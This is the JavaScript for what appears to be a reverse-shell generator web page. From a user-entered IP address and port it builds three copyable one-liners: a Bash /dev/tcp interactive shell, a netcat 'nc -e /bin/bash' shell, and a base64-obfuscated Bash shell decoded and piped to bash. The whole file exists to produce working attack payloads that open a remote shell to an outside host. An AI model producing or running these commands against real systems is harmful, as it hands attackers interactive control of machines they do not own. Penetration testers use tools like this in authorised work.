document.addEventListener('DOMContentLoaded', () => {
    const ipAddressInput = document.getElementById('ipAddress');
    const portInput = document.getElementById('port');
    const generatedCommandsContainer = document.getElementById('generatedCommands');

    const shellCommands = [
        { type: 'bash', name: 'Bash TCP' },
        { type: 'nc', name: 'Netcat' },
        { type: 'bash_base64', name: 'Bash TCP (Base64)' }
    ];

    const generateAllShellCommands = () => {
        const ip = ipAddressInput.value.trim();
        const port = portInput.value.trim();

        generatedCommandsContainer.innerHTML = ''; // Clear previous commands

        if (!ip || !port) {
            generatedCommandsContainer.innerHTML = '<p class="text-red-400">Please enter both IP address and port.</p>';
            return;
        }

        shellCommands.forEach(shell => {
            let command = '';
            switch (shell.type) {
                case 'bash':
                    command = `/bin/bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
                    break;
                case 'nc':
                    command = `nc -e /bin/bash ${ip} ${port}`;
                    break;
                case 'bash_base64':
                    const bashCommand = `/bin/bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
                    command = `echo ${btoa(bashCommand)}|base64 -d|bash`;
                    break;
            }

            const commandDiv = document.createElement('div');
            commandDiv.className = 'bg-gray-700 p-4 rounded-md relative';
            commandDiv.innerHTML = `
                <label class="block text-sm font-bold mb-2 text-gray-300">${shell.name}:</label>
                <textarea rows="3" readonly class="shadow appearance-none border border-gray-600 rounded w-full py-2 px-3 text-gray-200 bg-gray-800 leading-tight focus:outline-none focus:shadow-outline font-mono text-sm">${command}</textarea>
                <button class="copy-btn absolute top-4 right-4 bg-blue-500 hover:bg-blue-700 text-white font-bold py-1 px-2 rounded text-xs">
                    Copy
                </button>
            `;
            generatedCommandsContainer.appendChild(commandDiv);
        });

        // Add event listeners for copy buttons
        document.querySelectorAll('.copy-btn').forEach(button => {
            button.addEventListener('click', (event) => {
                const textarea = event.target.previousElementSibling;
                textarea.select();
                textarea.setSelectionRange(0, 99999); // For mobile devices

                try {
                    document.execCommand('copy');
                    button.textContent = 'Copied!';
                    setTimeout(() => {
                        button.textContent = 'Copy';
                    }, 2000);
                } catch (err) {
                    console.error('Failed to copy: ', err);
                    button.textContent = 'Failed!';
                }
            });
        });
    };

    ipAddressInput.addEventListener('input', generateAllShellCommands);
    portInput.addEventListener('input', generateAllShellCommands);

    // Initial generation
    generateAllShellCommands();
});
